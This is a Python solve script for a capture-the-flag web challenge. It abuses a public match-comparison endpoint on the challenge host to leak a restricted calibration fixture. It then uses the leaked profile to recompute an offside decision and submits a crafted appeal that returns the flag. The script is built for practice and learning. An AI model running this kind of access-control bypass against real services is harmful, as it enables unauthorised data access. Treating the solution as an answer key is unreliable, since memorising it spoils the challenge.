#!/usr/bin/env python3
"""
Exploit for z0d1akCTF 2026 Qualifiers / Web / hydra-fc-will-come-back.

The gateway exposes a public comparison endpoint that can be anchored on a
public match while also leaking restricted calibration fixtures.  We use that to
replace the bad CAM-EAST match profile with the validated EAST-CAL-042 profile,
recompute the VAR margin from the published spec, then submit the appeal.
"""

from __future__ import annotations

import argparse
import json
import math
import sys
import urllib.error
import urllib.request
from pathlib import Path
from typing import Any


DEFAULT_BASE_URL = "https://offside-11mm-f4482f101f79.chals.z0d1ak.org"
MATCH_ID = "HYD-SS-FINAL"
PUBLIC_ANCHOR_ID = "HYD-IU-LEAGUE"
CALIBRATION_ID = "HYD-CAL-EAST-042"

ELIGIBLE_KEYPOINTS = [
    "head",
    "left_shoulder",
    "right_shoulder",
    "torso",
    "left_knee",
    "right_knee",
    "left_foot",
    "right_foot",
]


def js_round(value: float) -> int:
    """JavaScript Math.round-compatible behavior for the positive range here."""
    return math.floor(value + 0.5)


def request_json(
    base_url: str,
    method: str,
    path: str,
    body: dict[str, Any] | None = None,
) -> dict[str, Any]:
    url = base_url.rstrip("/") + path
    data = None if body is None else json.dumps(body).encode()
    headers = {"content-type": "application/json"} if body is not None else {}
    req = urllib.request.Request(url, data=data, headers=headers, method=method)

    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            raw = resp.read()
    except urllib.error.HTTPError as exc:
        raw = exc.read()

    return json.loads(raw.decode())


def write_json(path: Path, value: Any) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(value, indent=2, sort_keys=True) + "\n")


def read_json(path: Path) -> dict[str, Any]:
    return json.loads(path.read_text())


def compare(
    base_url: str,
    match_ids: list[str],
    streams: list[str],
) -> dict[str, Any]:
    return request_json(
        base_url,
        "POST",
        "/api/v1/compare",
        {"match_ids": match_ids, "streams": streams},
    )


def derive_evidence(
    root: dict[str, Any],
    fixtures: dict[str, Any],
    summary: dict[str, Any],
    public_compare: dict[str, Any],
    calibration_compare: dict[str, Any],
    appeal_response: dict[str, Any] | None = None,
) -> dict[str, Any]:
    match = get_match(public_compare, MATCH_ID)
    raw_tracking = match["streams"]["raw_tracking"]
    imu_by_frame = {item["frame"]: item for item in match["streams"]["deck_imu"]}
    published_calibrations = calibration_map(match)

    active_profile = summary["system_profile"]
    bad_sensor = next(
        sensor
        for sensor, calibration in published_calibrations.items()
        if calibration["id"] == active_profile
    )

    calibration_fixture = get_match(calibration_compare, CALIBRATION_ID)
    corrected_profile = calibration_fixture["streams"]["calibration"][0]
    corrected_calibrations = {
        sensor: dict(calibration)
        for sensor, calibration in published_calibrations.items()
    }
    corrected_calibrations[bad_sensor] = dict(corrected_profile)

    kick = find_kick_frame(raw_tracking)
    published_decision = decision_at_frame(
        kick, published_calibrations, imu_by_frame
    )
    corrected_decision = decision_at_frame(
        kick, corrected_calibrations, imu_by_frame
    )

    appeal = {
        "match_id": MATCH_ID,
        "kick_frame": kick["frame"],
        "bad_sensor": bad_sensor,
        "correct_profile": corrected_profile["id"],
        "corrected_margin_mm": corrected_decision["margin_mm"],
    }

    evidence = {
        "root": root,
        "fixtures": fixtures,
        "summary": summary,
        "active_bad_profile": published_calibrations[bad_sensor],
        "validated_replacement_profile": corrected_profile,
        "kick_frame_ball": kick["ball"],
        "published_decision": published_decision,
        "corrected_decision": corrected_decision,
        "appeal_payload": appeal,
    }
    if appeal_response is not None:
        evidence["appeal_response"] = appeal_response
    return evidence


def get_match(compare_response: dict[str, Any], match_id: str) -> dict[str, Any]:
    for match in compare_response["matches"]:
        if match["id"] == match_id:
            return match
    raise ValueError(f"missing match {match_id}")


def calibration_map(match: dict[str, Any]) -> dict[str, dict[str, Any]]:
    return {
        item["sensor"]: dict(item)
        for item in match["streams"].get("calibration", [])
    }


def corrected_x(
    observation: dict[str, Any],
    calibration: dict[str, Any],
    imu_by_frame: dict[int, dict[str, Any]],
    frame_id: int,
) -> int:
    pitch = imu_by_frame[frame_id]["pitch_deg"]
    return (
        observation["raw_x_mm"]
        + calibration["longitudinal_offset_mm"]
        + js_round(
            (pitch - calibration["reference_pitch_deg"])
            * calibration["mm_per_degree"]
        )
    )


def player_line(
    player: dict[str, Any],
    frame_id: int,
    calibrations: dict[str, dict[str, Any]],
    imu_by_frame: dict[int, dict[str, Any]],
) -> tuple[int, dict[str, Any]]:
    best_keypoint: dict[str, Any] | None = None
    best_line: int | None = None

    for keypoint in ELIGIBLE_KEYPOINTS:
        observations = player["keypoints"][keypoint]
        observation = max(observations, key=lambda item: item["confidence"])
        sensor = observation["sensor"]
        calibration = calibrations[sensor]
        x_mm = corrected_x(observation, calibration, imu_by_frame, frame_id)

        detail = {
            "keypoint": keypoint,
            "sensor": sensor,
            "raw_x_mm": observation["raw_x_mm"],
            "confidence": observation["confidence"],
            "calibration_id": calibration["id"],
            "calibration_offset_mm": calibration["longitudinal_offset_mm"],
            "corrected_x_mm": x_mm,
        }
        if best_line is None or x_mm > best_line:
            best_line = x_mm
            best_keypoint = detail

    assert best_line is not None and best_keypoint is not None
    return best_line, best_keypoint


def decision_at_frame(
    raw_frame: dict[str, Any],
    calibrations: dict[str, dict[str, Any]],
    imu_by_frame: dict[int, dict[str, Any]],
) -> dict[str, Any]:
    frame_id = raw_frame["frame"]
    player_lines = []

    for player in raw_frame["players"]:
        line_mm, detail = player_line(player, frame_id, calibrations, imu_by_frame)
        player_lines.append(
            {
                "player": player["id"],
                "team": player["team"],
                "line_mm": line_mm,
                "deciding_keypoint": detail,
            }
        )

    attacker = next(item for item in player_lines if item["player"] == "SHAKES")
    defenders = sorted(
        (item for item in player_lines if item["team"] == "HYDRA"),
        key=lambda item: item["line_mm"],
        reverse=True,
    )
    defender = defenders[1]
    margin = attacker["line_mm"] - defender["line_mm"]

    return {
        "frame": frame_id,
        "attacker": attacker,
        "defender_line_player": defender,
        "all_player_lines": sorted(
            player_lines, key=lambda item: item["line_mm"], reverse=True
        ),
        "margin_mm": margin,
        "decision": "OFFSIDE" if margin > 0 else "ONSIDE",
    }


def find_kick_frame(raw_tracking: list[dict[str, Any]]) -> dict[str, Any]:
    candidates = [
        frame
        for frame in raw_tracking
        if frame["ball"]["acceleration_mps2"] >= 20
        and frame["ball"]["foot_ball_distance_mm"] <= 80
    ]
    if len(candidates) != 1:
        raise ValueError(f"expected one kick frame, found {len(candidates)}")
    return candidates[0]


def solve(base_url: str, artifacts_dir: Path | None = None) -> dict[str, Any]:
    root = request_json(base_url, "GET", "/")
    fixtures = request_json(base_url, "GET", "/api/v1/fixtures?team=hydra")
    summary = request_json(base_url, "GET", f"/api/v1/matches/{MATCH_ID}/summary")

    public_compare = compare(
        base_url,
        [MATCH_ID, PUBLIC_ANCHOR_ID],
        ["raw_tracking", "deck_imu", "calibration", "audit"],
    )
    calibration_compare = compare(
        base_url,
        [MATCH_ID, CALIBRATION_ID],
        ["raw_tracking", "deck_imu", "calibration", "audit"],
    )

    evidence = derive_evidence(
        root, fixtures, summary, public_compare, calibration_compare
    )
    appeal = evidence["appeal_payload"]
    appeal_response = request_json(base_url, "POST", "/api/v1/appeal", appeal)
    evidence["appeal_response"] = appeal_response

    if artifacts_dir is not None:
        write_json(artifacts_dir / "root.json", root)
        write_json(artifacts_dir / "fixtures.json", fixtures)
        write_json(artifacts_dir / "match-summary.json", summary)
        write_json(artifacts_dir / "compare-public.json", public_compare)
        write_json(artifacts_dir / "compare-calibration.json", calibration_compare)
        write_json(artifacts_dir / "evidence-summary.json", evidence)
        write_json(artifacts_dir / "appeal-response.json", appeal_response)

    return evidence


def solve_offline(artifacts_dir: Path) -> dict[str, Any]:
    root = read_json(artifacts_dir / "root.json")
    fixtures = read_json(artifacts_dir / "fixtures.json")
    summary = read_json(artifacts_dir / "match-summary.json")
    public_compare = read_json(artifacts_dir / "compare-public.json")
    calibration_compare = read_json(artifacts_dir / "compare-calibration.json")

    appeal_response_path = artifacts_dir / "appeal-response.json"
    appeal_response = (
        read_json(appeal_response_path) if appeal_response_path.exists() else None
    )
    return derive_evidence(
        root,
        fixtures,
        summary,
        public_compare,
        calibration_compare,
        appeal_response,
    )


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("base_url", nargs="?", default=DEFAULT_BASE_URL)
    parser.add_argument(
        "--artifacts-dir",
        type=Path,
        help="optional directory where API captures and derived evidence are written",
    )
    parser.add_argument(
        "--offline-artifacts",
        type=Path,
        help="recompute the appeal from committed captures instead of using network",
    )
    args = parser.parse_args()

    if args.offline_artifacts is not None:
        evidence = solve_offline(args.offline_artifacts)
        if args.artifacts_dir is not None:
            write_json(args.artifacts_dir / "evidence-summary.json", evidence)
    else:
        evidence = solve(args.base_url, args.artifacts_dir)

    print(json.dumps(evidence["appeal_payload"], indent=2))

    appeal_response = evidence.get("appeal_response", {})
    if appeal_response:
        print(json.dumps(appeal_response, indent=2))

    flag = appeal_response.get("flag")
    if flag:
        print(f"[+] FLAG: {flag}")
    elif args.offline_artifacts is not None:
        print("[*] offline calculation complete; no appeal response artifact present")
    else:
        sys.exit("[!] appeal did not return a flag")


if __name__ == "__main__":
    main()
